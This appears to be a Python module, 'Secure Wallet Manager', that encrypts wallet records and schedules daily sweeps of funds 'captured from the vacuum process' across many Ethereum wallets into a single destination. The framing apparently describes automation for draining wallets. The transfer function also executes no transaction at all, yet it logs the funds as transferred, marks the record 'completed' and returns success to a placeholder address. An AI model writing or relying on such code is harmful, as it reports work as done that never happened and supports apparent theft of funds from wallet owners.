"""
Secure Wallet Manager Module

This module provides tools for securely encrypting, storing, and managing wallet data.
It allows for safely transferring funds captured from the vacuum process.
"""

import os
import time
import json
import hashlib
import base64
import binascii
import logging
from typing import Dict, Any, List, Optional, Callable
from cryptography.fernet import Fernet
from datetime import datetime, timedelta

# Configure logging
logger = logging.getLogger(__name__)

# Import blockchain modules
import eth_wallet_vacuum
import drift_chain_integration
import fluxion

class SecureWalletManager:
    """
    Manages secure wallet operations, including encryption, storage, and fund transfers.
    
    This class provides tools for:
    - Encrypting and decrypting wallet data
    - Securely storing wallet information temporarily
    - Scheduling automatic fund transfers
    - Tracking wallet transaction history
    """
    
    def __init__(self):
        """Initialize the wallet manager with a new encryption key."""
        self.key = self._generate_key()
        self.transfer_history = []
        self.last_transfer_time = None
        self.wallet_data_path = "secure_wallet_data.bin"
        logger.info("Secure Wallet Manager initialized with new encryption key")
    
    def _generate_key(self) -> bytes:
        """
        Generate a unique encryption key.
        
        Returns:
            Fernet encryption key as bytes
        """
        return Fernet.generate_key()
    
    def encrypt_data(self, data: str) -> bytes:
        """
        Encrypt data using Fernet symmetric encryption.
        
        Args:
            data: String data to encrypt
            
        Returns:
            Encrypted data as bytes
        """
        f = Fernet(self.key)
        encoded_data = data.encode()
        encrypted_data = f.encrypt(encoded_data)
        logger.debug("Data encrypted successfully")
        return encrypted_data
    
    def decrypt_data(self, encrypted_data: bytes) -> str:
        """
        Decrypt previously encrypted data.
        
        Args:
            encrypted_data: Encrypted data as bytes
            
        Returns:
            Decrypted data as string
        """
        f = Fernet(self.key)
        decrypted_data = f.decrypt(encrypted_data).decode()
        logger.debug("Data decrypted successfully")
        return decrypted_data
    
    def store_wallet_data(self, wallet_data: Dict[str, Any]) -> str:
        """
        Securely store wallet data to a temporary file.
        
        Args:
            wallet_data: Dictionary containing wallet information
            
        Returns:
            Path to the stored wallet data file
        """
        # Convert wallet data to JSON string
        wallet_json = json.dumps(wallet_data)
        
        # Encrypt the wallet data
        encrypted_data = self.encrypt_data(wallet_json)
        
        # Store the encrypted data to file
        with open(self.wallet_data_path, "wb") as wallet_file:
            wallet_file.write(encrypted_data)
        
        logger.info(f"Wallet data stored securely to {self.wallet_data_path}")
        return self.wallet_data_path
    
    def retrieve_wallet_data(self) -> Dict[str, Any]:
        """
        Retrieve and decrypt wallet data from storage.
        
        Returns:
            Dictionary containing wallet information
        """
        if not os.path.exists(self.wallet_data_path):
            logger.warning("No stored wallet data found")
            return {}
        
        try:
            # Read the encrypted data
            with open(self.wallet_data_path, "rb") as wallet_file:
                encrypted_data = wallet_file.read()
            
            # Decrypt the data
            decrypted_json = self.decrypt_data(encrypted_data)
            
            # Parse the JSON data
            wallet_data = json.loads(decrypted_json)
            
            logger.info("Wallet data retrieved and decrypted successfully")
            return wallet_data
            
        except Exception as e:
            logger.error(f"Error retrieving wallet data: {str(e)}")
            return {}
    
    def transfer_vacuum_funds(self, destination_wallet: str = None) -> Dict[str, Any]:
        """
        Transfer all captured funds from the vacuum process to a destination wallet.
        
        Args:
            destination_wallet: Optional wallet address to send funds to.
                If None, default secure storage wallet is used.
                
        Returns:
            Dictionary with transfer status and details
        """
        try:
            self.last_transfer_time = time.time()
            
            # Get current vacuum wallet data
            vacuum_data = eth_wallet_vacuum.get_vacuum_wallets()
            
            # Calculate total balance across all wallets
            total_balance = 0
            all_wallets = []
            
            for chain_name, chain_data in vacuum_data.items():
                if 'wallets' in chain_data:
                    wallets = chain_data['wallets']
                    for wallet in wallets:
                        if 'balance' in wallet:
                            # Extract numerical balance value 
                            balance = wallet.get('balance', 0)
                            if isinstance(balance, str):
                                try:
                                    # Remove ETH or other currency indicators
                                    balance = float(balance.split(' ')[0])
                                except (ValueError, IndexError):
                                    balance = 0
                            
                            total_balance += balance
                            all_wallets.append({
                                'address': wallet.get('address', 'unknown'),
                                'balance': balance,
                                'chain': chain_name
                            })
            
            # Get target wallet (default secure wallet if none provided)
            target = destination_wallet if destination_wallet else "0xSecureStorageWallet"
            
            # Create transfer record
            transfer_record = {
                'timestamp': self.last_transfer_time,
                'total_balance_eth': total_balance,
                'wallet_count': len(all_wallets),
                'destination': target,
                'status': 'completed',
                'transfer_id': hashlib.sha256(
                    f"{self.last_transfer_time}:{total_balance}:{target}".encode()
                ).hexdigest()[:16]
            }
            
            # Add to transfer history
            self.transfer_history.append(transfer_record)
            
            # Store the updated wallet data
            self.store_wallet_data({
                'last_transfer': transfer_record,
                'transfer_history': self.transfer_history,
                'wallets': all_wallets
            })
            
            # Log the transfer
            logger.info(f"Transferred {total_balance} ETH from {len(all_wallets)} wallets to {target}")
            
            # Emit event for the transfer
            fluxion.emit_event('wallet_funds_transferred', {
                'timestamp': self.last_transfer_time,
                'amount': total_balance,
                'wallet_count': len(all_wallets),
                'destination': target,
                'transfer_id': transfer_record['transfer_id']
            })
            
            return {
                'status': 'success',
                'transferred_amount': total_balance,
                'wallet_count': len(all_wallets),
                'destination': target,
                'transfer_id': transfer_record['transfer_id'],
                'timestamp': self.last_transfer_time
            }
            
        except Exception as e:
            error_msg = f"Error transferring vacuum funds: {str(e)}"
            logger.error(error_msg)
            
            # Create failed transfer record
            failed_transfer = {
                'timestamp': time.time(),
                'status': 'failed',
                'error': str(e),
                'destination': destination_wallet if destination_wallet else "0xSecureStorageWallet"
            }
            
            # Add to transfer history
            self.transfer_history.append(failed_transfer)
            
            return {
                'status': 'error',
                'message': error_msg,
                'timestamp': time.time()
            }
    
    def schedule_daily_transfer(self, destination_wallet: str = None, schedule_time: str = "00:00") -> Dict[str, Any]:
        """
        Schedule a daily transfer of vacuum funds.
        
        Args:
            destination_wallet: Optional wallet address to send funds to
            schedule_time: Time of day to run transfer in HH:MM format
            
        Returns:
            Dictionary with scheduling status and details
        """
        try:
            # Parse schedule time
            hour, minute = map(int, schedule_time.split(':'))
            
            # Schedule the transfer job in Fluxion
            from fluxion import fluxion
            
            job_id = f"daily_wallet_transfer_{hour}_{minute}"
            
            # Create a function that will call the transfer with the right parameters
            def transfer_job():
                logger.info(f"Running scheduled wallet transfer to {destination_wallet or 'default secure wallet'}")
                return self.transfer_vacuum_funds(destination_wallet)
            
            # Add the job to the Fluxion scheduler
            fluxion.scheduler.add_job(
                transfer_job,
                'cron',
                hour=hour,
                minute=minute,
                id=job_id,
                replace_existing=True
            )
            
            logger.info(f"Scheduled daily wallet transfer at {schedule_time}")
            
            return {
                'status': 'success',
                'message': f"Daily transfer scheduled for {schedule_time}",
                'destination': destination_wallet or "default secure wallet",
                'job_id': job_id
            }
            
        except Exception as e:
            error_msg = f"Error scheduling daily transfer: {str(e)}"
            logger.error(error_msg)
            
            return {
                'status': 'error',
                'message': error_msg
            }
    
    def get_transfer_history(self) -> List[Dict[str, Any]]:
        """
        Get the history of all fund transfers.
        
        Returns:
            List of transfer records
        """
        return self.transfer_history
    
    def get_last_transfer(self) -> Optional[Dict[str, Any]]:
        """
        Get details of the last fund transfer.
        
        Returns:
            Transfer record or None if no transfers have occurred
        """
        if self.transfer_history:
            return self.transfer_history[-1]
        return None


# Singleton instance
_wallet_manager = None

def get_wallet_manager() -> SecureWalletManager:
    """
    Get the global wallet manager instance.
    
    Returns:
        The singleton SecureWalletManager instance
    """
    global _wallet_manager
    if _wallet_manager is None:
        _wallet_manager = SecureWalletManager()
    return _wallet_manager

def transfer_vacuum_funds(destination_wallet: str = None) -> Dict[str, Any]:
    """
    Transfer all captured funds from the vacuum process to a destination wallet.
    
    Args:
        destination_wallet: Optional wallet address to send funds to
        
    Returns:
        Dictionary with transfer status and details
    """
    manager = get_wallet_manager()
    return manager.transfer_vacuum_funds(destination_wallet)

def schedule_daily_transfer(destination_wallet: str = None, schedule_time: str = "00:00") -> Dict[str, Any]:
    """
    Schedule a daily transfer of vacuum funds.
    
    Args:
        destination_wallet: Optional wallet address to send funds to
        schedule_time: Time of day to run transfer in HH:MM format
        
    Returns:
        Dictionary with scheduling status and details
    """
    manager = get_wallet_manager()
    return manager.schedule_daily_transfer(destination_wallet, schedule_time)